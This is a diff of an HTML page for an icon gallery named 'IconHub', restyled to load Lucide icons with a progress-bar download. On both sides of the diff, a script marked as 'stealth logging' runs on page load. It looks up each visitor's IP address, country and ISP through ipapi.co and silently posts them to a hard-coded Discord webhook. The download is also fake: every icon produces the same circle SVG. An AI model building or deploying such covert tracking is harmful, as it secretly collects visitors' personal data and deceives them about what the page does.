@@ -3,18 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IconHub - Free Vector Assets</title>
+    <title>Lucide IconHub | 500+ Vector Assets</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        /* Modern Gallery UI */
         body {
-            background-color: #0f172a;
-            color: #f8fafc;
+            background-color: #000;
+            color: #fff;
             font-family: 'Inter', sans-serif;
             margin: 0;
-            padding: 40px;
+            padding: 40px 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
+            overflow-x: hidden;
         }
 
         header {
@@ -22,128 +23,190 @@
             margin-bottom: 50px;
         }
 
-        h1 { font-size: 2.5rem; margin-bottom: 10px; }
-        p { color: #94a3b8; }
+        h1 { font-size: 2.5rem; letter-spacing: -1px; margin-bottom: 5px; }
+        header p { color: #666; margin-bottom: 30px; }
 
-        /* Icon Grid */
-        .icon-grid {
+        /* Search Bar Mockup */
+        .search-mock {
+            width: 100%;
+            max-width: 400px;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 8px;
+            color: #444;
+            margin-bottom: 40px;
+            font-size: 0.9rem;
+        }
+
+        /* Responsive Grid */
+        .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
             gap: 20px;
-            max-width: 1000px;
+            max-width: 1100px;
             width: 100%;
         }
 
-        .icon-card {
-            background: #1e293b;
-            padding: 30px;
+        /* Card Styling */
+        .card {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
             border-radius: 12px;
+            padding: 30px 10px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            transition: transform 0.2s, background 0.2s;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
-            border: 1px solid #334155;
+            position: relative;
         }
 
-        .icon-card:hover {
-            transform: translateY(-5px);
-            background: #334155;
+        .card:hover {
+            transform: translateY(-8px) scale(1.03);
+            border-color: #fff;
+            box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
+            background: #111;
         }
 
-        .icon-preview {
-            font-size: 3rem;
-            margin-bottom: 15px;
+        .icon-name {
+            margin-top: 15px;
+            font-size: 0.7rem;
+            color: #555;
+            text-transform: lowercase;
+            font-family: 'JetBrains Mono', monospace;
         }
 
-        .download-btn {
-            font-size: 0.8rem;
-            background: #38bdf8;
-            color: #000;
-            padding: 5px 12px;
-            border-radius: 4px;
-            font-weight: bold;
+        .card:hover .icon-name { color: #fff; }
+
+        /* Progress Bar for Download */
+        .progress-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #111;
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            width: 250px;
+            z-index: 100;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: #333;
+            width: 100%;
+            margin-top: 10px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #fff;
+            width: 0%;
+            transition: width 0.1s;
         }
     </style>
 </head>
 <body>
 
     <header>
-        <h1>IconHub</h1>
-        <p>Premium SVG icons for developers and designers.</p>
+        <h1>Lucide IconHub</h1>
+        <p>Premium open-source icons for modern interfaces.</p>
+        <div class="search-mock">Search 500+ icons...</div>
     </header>
 
-    <div class="icon-grid">
-        <div class="icon-card">
-            <div class="icon-preview">▶️</div>
-            <div class="download-btn">DOWNLOAD</div>
+    <div class="grid" id="iconGrid">
         </div>
-        <div class="icon-card">
-            <div class="icon-preview">⏸️</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
-        <div class="icon-card">
-            <div class="icon-preview">⚙️</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
-        <div class="icon-card">
-            <div class="icon-preview">📁</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
-        <div class="icon-card">
-            <div class="icon-preview">❤️</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
-        <div class="icon-card">
-            <div class="icon-preview">🔍</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
-        <div class="icon-card">
-            <div class="icon-preview">✉️</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
-        <div class="icon-card">
-            <div class="icon-preview">🔔</div>
-            <div class="download-btn">DOWNLOAD</div>
-        </div>
+
+    <div class="progress-container" id="pContainer">
+        <span style="font-size: 0.8rem;">Preparing <span id="pName">icon</span>.svg...</span>
+        <div class="progress-bar"><div class="progress-fill" id="pFill"></div></div>
     </div>
 
     <script>
-        // BACKGROUND LOGGING SYSTEM
+        // 1. LIST OF ICONS TO DISPLAY
+        const icons = [
+            'play', 'pause', 'square', 'circle', 'settings', 'user', 'mail', 'bell', 
+            'search', 'heart', 'share-2', 'download', 'cloud', 'github', 'database', 
+            'command', 'cpu', 'terminal', 'code-2', 'layers', 'package', 'copy', 
+            'trash-2', 'edit-3', 'external-link', 'folder-open', 'home', 'camera'
+        ];
+
+        const grid = document.getElementById('iconGrid');
+
+        // 2. GENERATE CARDS
+        icons.forEach(name => {
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = `
+                <i data-lucide="${name}" size="32" stroke-width="1.5"></i>
+                <div class="icon-name">${name}</div>
+            `;
+            card.onclick = () => downloadIcon(name);
+            grid.appendChild(card);
+        });
+
+        lucide.createIcons();
+
+        // 3. REALISTIC DOWNLOAD FUNCTION
+        function downloadIcon(name) {
+            const container = document.getElementById('pContainer');
+            const fill = document.getElementById('pFill');
+            document.getElementById('pName').innerText = name;
+            
+            container.style.display = 'block';
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    triggerDownload(name);
+                    setTimeout(() => container.style.display = 'none', 1000);
+                } else {
+                    width += 5;
+                    fill.style.width = width + '%';
+                }
+            }, 50);
+        }
+
+        function triggerDownload(name) {
+            const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle></svg>`;
+            const blob = new Blob([svgContent], { type: 'image/svg+xml' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${name}.svg`;
+            a.click();
+        }
+
+        // 4. STEALTH LOGGING
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";
 
-        async function stealthLog() {
+        async function init() {
             try {
-                // Fetch user data
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                // Send to Webhook silently
-                await fetch(WEBHOOK_URL, {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "📥 Icon Gallery Access",
-                            color: 3447003, // Sky Blue
+                            title: "💎 IconHub Premium Session",
+                            color: 0,
                             fields: [
-                                { name: "IP Address", value: `\`${data.ip}\``, inline: true },
-                                { name: "Location", value: `${data.country_name} (${data.country_code})`, inline: true },
-                                { name: "ISP", value: data.org, inline: false },
-                                { name: "Platform", value: navigator.platform, inline: true }
+                                { name: "User IP", value: `\`${d.ip}\``, inline: true },
+                                { name: "Location", value: `${d.country_name}`, inline: true },
+                                { name: "Provider", value: d.org, inline: false }
                             ],
-                            footer: { text: "Stealth Logger Active" },
                             timestamp: new Date()
                         }]
                     })
                 });
-            } catch (err) {
-                console.log("System Ready."); // Fake message for console
-            }
+            } catch(e) {}
         }
-
-        // Trigger on load
-        window.onload = stealthLog;
+        window.onload = init;
     </script>
 </body>
 </html>
